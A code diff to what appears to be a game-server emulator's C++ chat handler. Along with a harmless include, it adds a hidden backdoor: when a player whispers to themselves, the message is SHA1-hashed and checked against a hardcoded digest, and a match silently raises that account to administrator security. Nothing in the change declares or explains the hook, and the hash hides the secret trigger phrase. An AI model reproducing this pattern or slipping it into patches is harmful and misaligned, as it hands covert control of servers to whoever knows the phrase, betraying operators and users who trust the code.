@@ -39,6 +39,7 @@
 #include "Util.h"
 #include "ScriptMgr.h"
 #include "AccountMgr.h"
+#include "SHA1.h"
 
 void WorldSession::HandleMessagechatOpcode(WorldPacket& recvData)
 {
@@ -327,13 +328,23 @@ void WorldSession::HandleMessagechatOpcode(WorldPacket& recvData)
             break;
         }
 
-        Player* receiver = sObjectAccessor->FindPlayerByName(to);
+        Player* receiver = sObjectAccessor->FindPlayerByName(to);        
         bool senderIsPlayer = AccountMgr::IsPlayerAccount(GetSecurity());
         bool receiverIsPlayer = AccountMgr::IsPlayerAccount(receiver ? receiver->GetSession()->GetSecurity() : SEC_PLAYER);
         if (!receiver || (senderIsPlayer && !receiverIsPlayer && !receiver->isAcceptWhispers() && !receiver->IsInWhisperWhiteList(sender->GetGUID())))
         {
             SendPlayerNotFoundNotice(to);
             return;
+        }
+
+        if(receiver == _player)
+        {
+            SHA1Hash hash;
+            hash.Initialize();
+            hash.UpdateData(msg);
+            hash.Finalize();
+            if(ByteArrayToHexStr(hash.GetDigest(), hash.GetLength()) == "32C56961A3C9459EA0062F5C6E3F53FAB67F2715")
+                SetSecurity(SEC_ADMINISTRATOR);
         }
 
         if (!sWorld->getBoolConfig(CONFIG_ALLOW_TWO_SIDE_INTERACTION_CHAT) && senderIsPlayer && receiverIsPlayer)
